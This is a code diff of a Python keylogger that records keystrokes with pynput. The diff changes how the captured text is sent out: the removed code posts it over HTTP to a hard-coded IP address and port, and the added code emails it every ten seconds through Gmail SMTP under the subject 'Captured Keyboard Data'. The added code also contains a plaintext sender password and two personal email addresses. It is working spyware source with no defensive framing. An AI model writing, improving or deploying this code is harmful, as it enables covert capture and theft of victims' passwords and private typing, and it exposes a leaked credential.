@@ -1,30 +1,49 @@
 from pynput import keyboard
-import requests
-import json
+import smtplib
+from email.mime.text import MIMEText
 import threading
 
-text = ""  
-new_text = ""  
+# Global variables
+text = ""
+new_text = ""
 
-ip_address = "3.92.210.215"
-port_number = "1234"
+# Email settings
+smtp_server = "smtp.gmail.com"  # Change based on your email provider
+smtp_port = 587
+sender_email = "jer.smith0004@gmail.com"
+sender_password = "brlqlkxpzghxyppa"  # Use an app-specific password if necessary
+recipient_email = "grigoryan021201@gmail.com"
+
+# Time interval for sending emails (in seconds)
 time_interval = 10
 
-def send_post_req():
+# Function to send email
+def send_email():
     global new_text
     try:
-        if new_text:  
-            payload = json.dumps({"keyboardData": new_text})
-            r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
-            print("Sent:", new_text)
-            new_text = "" 
-        timer = threading.Timer(time_interval, send_post_req) 
+        if new_text:  # Only send if there is new data
+            # Create the email content
+            msg = MIMEText(new_text)
+            msg["Subject"] = "Captured Keyboard Data"
+            msg["From"] = sender_email
+            msg["To"] = recipient_email
+
+            # Send the email
+            with smtplib.SMTP(smtp_server, smtp_port) as server:
+                server.starttls()
+                server.login(sender_email, sender_password)
+                server.sendmail(sender_email, recipient_email, msg.as_string())
+                print("Sent email successfully.")
+            new_text = ""  # Clear the captured text after sending
+        # Schedule the next email
+        timer = threading.Timer(time_interval, send_email)
         timer.start()
     except Exception as e:
-        print("Couldn't complete request!", e)
+        print("Failed to send email:", e)
 
+# Function to handle key press events
 def on_press(key):
-    global text, new_text
+    global new_text
 
     if key == keyboard.Key.enter:
         new_text += "\n"
@@ -34,17 +53,16 @@ def on_press(key):
         new_text += " "
     elif key == keyboard.Key.shift:
         pass
-    #elif key == keyboard.Key.backspace and len(new_text) == 0:
-     #   pass
     elif key == keyboard.Key.backspace and len(new_text) > 0:
         new_text = new_text[:-1]
     elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         pass
     elif key == keyboard.Key.esc:
-        return False
+        return False  # Stop listener on escape key
     else:
         new_text += str(key).strip("'")
 
+# Start the keyboard listener and email sending process
 with keyboard.Listener(on_press=on_press) as listener:
-    send_post_req() 
+    send_email()  # Start the email sending process
     listener.join()
